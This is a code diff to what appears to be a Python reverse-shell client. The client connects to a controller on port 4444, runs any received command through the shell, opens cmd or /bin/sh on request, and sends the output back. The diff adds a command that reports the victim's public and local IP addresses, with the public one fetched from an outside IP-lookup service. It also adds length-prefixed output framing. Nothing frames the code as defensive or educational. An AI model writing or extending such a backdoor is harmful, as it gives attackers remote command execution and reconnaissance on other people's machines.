@@ -2,6 +2,10 @@ import os
 import socket
 import subprocess
 import threading
+import struct
+import urllib.request
+import json
+
 
 IP = "127.0.0.1"
 PORT = 4444
@@ -11,25 +15,34 @@ def execute_command(cmd):
     try:
         if cmd.lower() == "opencmd":
             if os.name == "nt":
-                return subprocess.Popen(["cmd"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                return subprocess.Popen(["cmd"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             else:
-               return subprocess.Popen(["/bin/sh"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                return subprocess.Popen(["/bin/sh"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
         elif cmd.lower() == "getip":
-            return socket.gethostbyname(socket.gethostname())
+            lip = str(socket.gethostbyname(socket.gethostname()))
+            res = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3)
+            data = json.loads(res.read().decode())
+            pip = data.get('ip', 'Unknown')
+            output = {
+                "pip":pip,
+                "lip":lip
+            }
+            return json.dumps(output)
 
         elif cmd.lower() == "download":
             return f"{cmd} functionality to be implemented later."
         
         elif cmd.lower() == "upload":
             return f"{cmd} functionality to be implemented later."
-
+        
         else:
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
             return result.stdout if result.stdout else result.stderr
 
     except Exception as e:
         return f"Error: {e}"
+    
 
 def handle_server_commands(sock):
     """Receives commands from server and sends back output."""
@@ -37,18 +50,19 @@ def handle_server_commands(sock):
         try:
             cmd = sock.recv(1024).decode().strip()
             if not cmd:
-                continue
-
-            if cmd.lower() == "kill":
-                sock.close()
                 break
 
-            output = execute_command(cmd)
-            sock.sendall(output.encode())
+            output = str(execute_command(cmd))  
+            #print("Output: ",output)
+            if cmd.lower() in ["getip"]: 
+                sock.sendall(output.encode())  
+            else: 
+                sock.sendall(struct.pack('>I', len(output.encode())) + output.encode())
 
-        except Exception as e:
+        except (Exception, socket.error) as e:
             sock.sendall(f"Error: {e}".encode())
             break
+    socket.close()
 
 def start_client(ip, port):
     try:
